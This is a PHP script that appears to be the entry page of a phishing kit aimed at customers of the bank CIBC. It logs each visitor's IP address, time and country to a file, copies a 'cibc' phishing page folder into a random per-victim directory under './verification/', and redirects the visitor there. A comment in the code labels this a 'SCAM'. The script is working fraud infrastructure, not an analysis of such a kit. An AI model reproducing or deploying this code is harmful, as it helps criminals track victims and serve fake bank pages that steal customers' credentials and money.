<?php
 error_reporting(0);
 session_start();

 
 
 
 /// TIME
date_default_timezone_set('GMT');
$TIME = date("d-m-Y H:i:s"); 

/// COUNTRY
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $J7->geoplugin_countryName ; // Country

/// VISITOR
$ip = getenv("REMOTE_ADDR");
$file = fopen("Visit.txt","a");
fwrite($file,$ip."  -   ".$TIME."                  -        " . $COUNTRY ."\n")  ;







 include("crypt.php");
 
// Create User FOLDER SCAM !
for ($DIR = '', $i = 0, $z = strlen($a = 'ABCDEMN0123456789')-1; $i != 20; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./verification/".$DIR;
$JOkEr7="cibc";

function recurse_copy($JOkEr7,$DIR) {
$dir = opendir($JOkEr7);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($JOkEr7 . '/' . $file) ) {
recurse_copy($JOkEr7 . '/' . $file,$DIR . '/' . $file);
}
else {
copy($JOkEr7 . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}

recurse_copy( $JOkEr7, $DIR );
#END
 header("location:$DIR");
?>